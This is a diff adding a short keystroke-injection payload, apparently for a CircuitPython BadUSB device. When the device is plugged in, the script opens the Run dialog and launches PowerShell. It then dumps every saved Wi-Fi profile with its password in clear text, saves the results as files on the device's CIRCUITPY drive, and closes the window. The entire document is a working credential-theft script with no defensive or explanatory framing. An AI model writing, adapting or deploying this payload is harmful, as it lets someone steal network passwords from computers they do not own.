@@ -1,0 +1,13 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell.exe 
+ENTER
+DELAY 1500
+STRING $d = Get-Date -Format "yyyyMMddHHmmss"; netsh wlan show profile | Select-String -Pattern '(Profil.+:).+' | ForEach-Object { $wlan = $_.Matches.value.Split(":")[-1].Trim(); netsh wlan show profile $wlan key=clear  | Set-Content -Path (Join-Path (Get-PSDrive -Name (Get-Volume -FileSystemLabel CIRCUITPY).DriveLetter).Root "WLAN-$wlan-$d.txt"); }
+DELAY 500
+ENTER
+DELAY 3500
+STRING exit
+DELAY 300
+ENTER
